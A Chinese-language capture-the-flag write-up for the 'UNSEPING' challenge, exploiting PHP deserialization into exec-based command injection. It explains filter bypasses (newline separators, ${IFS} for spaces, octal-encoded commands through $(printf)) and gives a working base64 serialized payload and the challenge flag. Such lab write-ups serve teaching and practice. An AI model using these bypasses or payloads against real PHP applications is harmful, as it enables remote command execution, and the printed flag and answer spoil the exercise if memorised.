# UNSEPING

> 首先可看到这是通过POST传递参数ctf进行反序列化的,参数还用到base64编码,考察的是反序列化,把字符串转换为原始的对象结构,php反序列化过程中会调用魔术方法__wakeup,__wakeup又调用waf函数,从waf函数看来明显是绕过waf,对一些字符进行了过滤,要想办法绕过去,绕过去之后, __destruct方法通过call_user_func_array调用ping函数,ping函数又通过exec执行命令,从而达到目的

## 涉及函数

### __construct

> 在类实例化的时候,会自动调用该魔术方法,进行类的初始化

### __destruct

> 明确销毁对象或脚本结束时被调用

### in_array

> in_array(value,array,type)

> 判断一个值是否在数组

### array

> 创建数组

### call_user_func_array

>  call_user_func_array(callback $function, array \$param_arr)

> 把\$param_arr数组中的每个值作为参数在$function里执行.

### exec

> exec(string command, string [array], int [return_var]), command为执行的命令, array为执行的结果,return_var是返回值0或1,如果返回0则执行成功,返回1则执行失败

> 执行命令

### preg_match_all

> preg_match_all(pattern,subject,matches,flags,offset)

> 函数用于执行一个全局正则表达式匹配,可以搜索字符串中所有可以和正则表达式匹配的结果

### __wakeup

> 当使用unserialize时被调用,可用于做些对象的初始化操作

### var_dump

> 用于输出变量的相关信息

## 思路分析

> 通过代码可以分析得到,过滤了命令连接符号&、|、；因此常用命令连接符不可用,可以使用"%0a、%0d"及"\n,\v".

> 空格符号也被过滤,可以使用tab、${IFS}或者$IFS$9

> 路径连接符也被过滤,可以使用八进制、十六进制等编码绕过

> 通过__destruct函数可知构建的字符串中$method的值得是ping

> 先执行ls命令(八进制为\154\163)发现flag_1s_here目录,然后执行ls flag_1s_here命令(八进制为\154\163\32\146\154\141\147\137\49\163\137\150\145\162\145)存在flag_831b69012c67b35f.php文件,读取flag命令cat flag_1s_here/flag_831b69012c67b35f.php(八进制为\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160)

> 八进制编码绕过, $(printf "\154\163") ==>ls,至于为什么$(printf "\154\163")是ls,这是因为exec调用的linux的shell执行命令的,在shell中printf "\154\163"是输出ls的意思,在bash shell中,$( )与\` \`(反引号)都是用来做命令替换用的,命令替换是用来重组命令行的,先完成里面的命令,然后将其结果替换出来,再重组成新的命令行

## payload

> Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjQ6IiQocHJpbnRmCSJcMTQzXDE0MVwxNjRcNDBcMTQ2XDE1NFwxNDFcMTQ3XDEzN1w2MVwxNjNcMTM3XDE1MFwxNDVcMTYyXDE0NVw1N1wxNDZcMTU0XDE0MVwxNDdcMTM3XDcwXDYzXDYxXDE0Mlw2Nlw3MVw2MFw2MVw2MlwxNDNcNjZcNjdcMTQyXDYzXDY1XDE0Nlw1NlwxNjBcMTUwXDE2MCIpIjt9fQ==

## flag

> cyberpeace{5b158a7191487ed87f0caad4279e18e3}